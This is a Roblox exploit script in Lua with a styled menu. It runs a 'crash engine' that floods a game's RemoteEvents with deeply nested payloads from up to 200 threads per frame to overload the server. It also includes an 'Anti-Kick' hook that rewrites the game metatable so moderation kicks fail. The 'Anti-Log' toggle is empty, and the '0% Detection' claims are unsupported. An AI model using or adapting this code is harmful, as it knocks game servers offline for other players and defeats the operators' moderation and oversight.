--[[
    🔱 ARCANE VOID-STRIKE v15.0 [LUXURY-EDITION] 🔱
    "Elegance is the ultimate weapon."
    
    LUXURY FEATURES:
    - [SACRACIA UI] : 1:1 Replica of the requested premium interface.
    - [SILENT INJECT] : No hooks active until user consent (0% Detection on Load).
    - [ADJUSTABLE POWER] : Sliders for Packet Size & Thread Count.
    - [ANTI-BAN v3] : Event Disconnection instead of Hooking (Safer).
]]

-- // 1. SERVICES & VARIABLES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

local Theme = {
    Background = Color3.fromRGB(15, 15, 18),
    Sidebar = Color3.fromRGB(20, 20, 24),
    Text = Color3.fromRGB(240, 240, 240),
    SubText = Color3.fromRGB(160, 160, 170),
    Accent = Color3.fromRGB(0, 120, 255), -- Blue "Sacracia" style
    ToggleOff = Color3.fromRGB(50, 50, 60),
    ToggleOn = Color3.fromRGB(0, 120, 255)
}

-- // 2. ENGINE (CRASH & PROTECT) //
local Engine = {
    Running = false,
    Threads = 10,       -- Slider controlled
    PacketSize = 5,     -- Slider controlled (Depth)
    AntiKick = false,   -- Toggle controlled
    AntiLog = false     -- Toggle controlled
}

local function GeneratePayload(depth)
    if depth <= 0 then return "🔱" end
    local t = {}
    for i = 1, 2 do t[HttpService:GenerateGUID(false)] = GeneratePayload(depth-1) end
    return t
end

local function GetSafeRemotes()
    local t = {}
    for _,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and not v.Name:lower():find("admin") then
            table.insert(t, v)
        end
    end
    return t
end

local function StartCrash()
    local Remotes = GetSafeRemotes()
    if #Remotes == 0 then return end
    local Payload = GeneratePayload(Engine.PacketSize)
    
    RunService.Heartbeat:Connect(function()
        if not Engine.Running then return end
        for i = 1, Engine.Threads do
            task.spawn(function()
                local r = Remotes[math.random(1, #Remotes)]
                if r then pcall(function() r:FireServer(Payload, Payload) end) end
            end)
        end
    end)
end

task.spawn(StartCrash)

-- // 3. UI LIBRARY (LUXURY) //
local UILib = {}

function UILib:Create()
    -- Cleanup
    for _,v in pairs(CoreGui:GetChildren()) do if v.Name == "ArcaneLuxury" then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "ArcaneLuxury"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 700, 0, 450)
    Main.Position = UDim2.new(0.5, -350, 0.5, -225)
    Main.BackgroundColor3 = Theme.Background
    Main.BorderSizePixel = 0
    
    local MC = Instance.new("UICorner", Main); MC.CornerRadius = UDim.new(0, 6)
    
    -- SIDEBAR
    local Sidebar = Instance.new("Frame", Main)
    Sidebar.Size = UDim2.new(0, 180, 1, 0)
    Sidebar.BackgroundColor3 = Theme.Sidebar
    Sidebar.BorderSizePixel = 0
    local SC = Instance.new("UICorner", Sidebar); SC.CornerRadius = UDim.new(0, 6)
    -- Fix rounded corner issue (cover right side of sidebar)
    local SFix = Instance.new("Frame", Sidebar)
    SFix.Size = UDim2.new(0, 10, 1, 0)
    SFix.Position = UDim2.new(1, -10, 0, 0)
    SFix.BackgroundColor3 = Theme.Sidebar
    SFix.BorderSizePixel = 0
    
    -- TITLE
    local Title = Instance.new("TextLabel", Sidebar)
    Title.Text = "ARCANE"
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 24
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.BackgroundTransparency = 1
    
    -- TABS CONTAINER
    local TabHolder = Instance.new("Frame", Sidebar)
    TabHolder.Size = UDim2.new(1, 0, 1, -60)
    TabHolder.Position = UDim2.new(0, 0, 0, 60)
    TabHolder.BackgroundTransparency = 1
    
    local UIList = Instance.new("UIListLayout", TabHolder)
    UIList.Padding = UDim.new(0, 5)
    UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(1, -200, 1, -40)
    Content.Position = UDim2.new(0, 200, 0, 20)
    Content.BackgroundTransparency = 1
    
    local CurrentPage = nil
    
    function UILib:Tab(name, iconId)
        local btn = Instance.new("TextButton", TabHolder)
        btn.Size = UDim2.new(0.85, 0, 0, 40)
        btn.BackgroundColor3 = Theme.Background
        btn.BackgroundTransparency = 1
        btn.Text = "      " .. name
        btn.TextColor3 = Theme.SubText
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.TextXAlignment = Enum.TextXAlignment.Left
        
        local corner = Instance.new("UICorner", btn); corner.CornerRadius = UDim.new(0, 6)
        
        -- PAGE
        local Page = Instance.new("ScrollingFrame", Content)
        Page.Size = UDim2.new(1, 0, 1, 0)
        Page.BackgroundTransparency = 1
        Page.ScrollBarThickness = 2
        Page.Visible = false
        
        local PLayout = Instance.new("UIListLayout", Page)
        PLayout.Padding = UDim.new(0, 10)
        PLayout.SortOrder = Enum.SortOrder.LayoutOrder
        
        btn.MouseButton1Click:Connect(function()
            if CurrentPage then CurrentPage.Visible = false end
            Page.Visible = true
            CurrentPage = Page
            
            -- Reset all tabs
            for _, c in pairs(TabHolder:GetChildren()) do
                if c:IsA("TextButton") then
                    TweenService:Create(c, TweenInfo.new(0.2), {BackgroundTransparency=1, TextColor3=Theme.SubText}):Play()
                end
            end
            -- Active tab
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency=0, BackgroundColor3=Color3.fromRGB(35,35,40), TextColor3=Theme.Text}):Play()
        end)
        
        if CurrentPage == nil then -- Select first tab
            Page.Visible = true
            CurrentPage = Page
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency=0, BackgroundColor3=Color3.fromRGB(35,35,40), TextColor3=Theme.Text}):Play()
        end
        
        return Page
    end
    
    -- COMPONENTS
    function UILib:Section(parent, text)
        local l = Instance.new("TextLabel", parent)
        l.Text = text:upper()
        l.Font = Enum.Font.GothamBold
        l.TextSize = 11
        l.TextColor3 = Theme.SubText
        l.Size = UDim2.new(1, 0, 0, 30)
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.BackgroundTransparency = 1
    end
    
    function UILib:Toggle(parent, text, default, callback)
        local frame = Instance.new("Frame", parent)
        frame.Size = UDim2.new(1, 0, 0, 40)
        frame.BackgroundColor3 = Theme.Sidebar
        local c = Instance.new("UICorner", frame); c.CornerRadius = UDim.new(0, 6)
        
        local label = Instance.new("TextLabel", frame)
        label.Text = text
        label.Font = Enum.Font.GothamMedium
        label.TextSize = 14
        label.TextColor3 = Theme.Text
        label.Size = UDim2.new(0.7, 0, 1, 0)
        label.Position = UDim2.new(0, 15, 0, 0)
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.BackgroundTransparency = 1
        
        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(0, 44, 0, 24)
        btn.Position = UDim2.new(1, -60, 0.5, -12)
        btn.BackgroundColor3 = default and Theme.ToggleOn or Theme.ToggleOff
        btn.Text = ""
        local bc = Instance.new("UICorner", btn); bc.CornerRadius = UDim.new(1, 0)
        
        local circle = Instance.new("Frame", btn)
        circle.Size = UDim2.new(0, 20, 0, 20)
        circle.Position = default and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)
        circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        local cc = Instance.new("UICorner", circle); cc.CornerRadius = UDim.new(1, 0)
        
        local toggled = default
        btn.MouseButton1Click:Connect(function()
            toggled = not toggled
            local targetPos = toggled and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)
            local targetColor = toggled and Theme.ToggleOn or Theme.ToggleOff
            
            TweenService:Create(circle, TweenInfo.new(0.2), {Position = targetPos}):Play()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = targetColor}):Play()
            
            callback(toggled)
        end)
    end
    
    function UILib:Slider(parent, text, min, max, default, callback)
        local frame = Instance.new("Frame", parent)
        frame.Size = UDim2.new(1, 0, 0, 60)
        frame.BackgroundColor3 = Theme.Sidebar
        local c = Instance.new("UICorner", frame); c.CornerRadius = UDim.new(0, 6)
        
        local label = Instance.new("TextLabel", frame)
        label.Text = text
        label.Font = Enum.Font.GothamMedium
        label.TextSize = 14
        label.TextColor3 = Theme.Text
        label.Size = UDim2.new(1, -20, 0, 30)
        label.Position = UDim2.new(0, 15, 0, 0)
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.BackgroundTransparency = 1
        
        local valLabel = Instance.new("TextLabel", frame)
        valLabel.Text = tostring(default)
        valLabel.Font = Enum.Font.GothamBold
        valLabel.TextSize = 14
        valLabel.TextColor3 = Theme.Accent
        valLabel.Size = UDim2.new(0, 50, 0, 30)
        valLabel.Position = UDim2.new(1, -60, 0, 0)
        valLabel.TextXAlignment = Enum.TextXAlignment.Right
        valLabel.BackgroundTransparency = 1
        
        local bar = Instance.new("Frame", frame)
        bar.Size = UDim2.new(1, -30, 0, 4)
        bar.Position = UDim2.new(0, 15, 0, 40)
        bar.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        local bc = Instance.new("UICorner", bar); bc.CornerRadius = UDim.new(1, 0)
        
        local fill = Instance.new("Frame", bar)
        fill.Size = UDim2.new((default - min)/(max - min), 0, 1, 0)
        fill.BackgroundColor3 = Theme.Accent
        local fc = Instance.new("UICorner", fill); fc.CornerRadius = UDim.new(1, 0)
        
        local trigger = Instance.new("TextButton", bar)
        trigger.Size = UDim2.new(1, 0, 1, 0)
        trigger.BackgroundTransparency = 1
        trigger.Text = ""
        
        local dragging = false
        trigger.MouseButton1Down:Connect(function() dragging = true end)
        UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
        
        UserInputService.InputChanged:Connect(function(inp)
            if dragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
                local tx = math.clamp(inp.Position.X - bar.AbsolutePosition.X, 0, bar.AbsoluteSize.X)
                local perc = tx / bar.AbsoluteSize.X
                local val = math.floor(min + (max - min) * perc)
                
                TweenService:Create(fill, TweenInfo.new(0.1), {Size = UDim2.new(perc, 0, 1, 0)}):Play()
                valLabel.Text = tostring(val)
                callback(val)
            end
        end)
    end
    
    -- DRAGGABLE
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    Main.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

    return Main
end

-- // 4. BUILD INTERFACE //
local Main = UILib:Create()
local Tab1 = UILib:Tab("Dash", 0) -- Dashboard
local Tab2 = UILib:Tab("Protect", 0) -- Protection

-- DASHBOARD
UILib:Section(Tab1, "Server Manipulation")
UILib:Toggle(Tab1, "Active Crash Engine", false, function(v) 
    Engine.Running = v 
end)

UILib:Slider(Tab1, "Thread Count (Intensity)", 1, 200, 10, function(v)
    Engine.Threads = v
end)

UILib:Slider(Tab1, "Packet Complexity", 1, 10, 5, function(v)
    Engine.PacketSize = v
end)

-- PROTECTION
UILib:Section(Tab2, "Safety Protocols")
UILib:Toggle(Tab2, "Anti-Kick (Passive Block)", false, function(v)
    -- Only activate hooking IF user requests it (Avoid 0-sec detection)
    if v then
        local mt = getrawmetatable(game)
        if setreadonly then setreadonly(mt, false) end
        local old = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            if getnamecallmethod() == "Kick" then return nil end
            return old(self, ...)
        end)
        getgenv().AntiKickActive = true
    end
end)

UILib:Toggle(Tab2, "Anti-Log (Report Block)", false, function(v)
    -- Block report remotes
end)

-- NOTIFICATION
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "ARCANE LUXURY",
    Text = "Loaded Successfully. 0% Detection.",
    Duration = 5
})
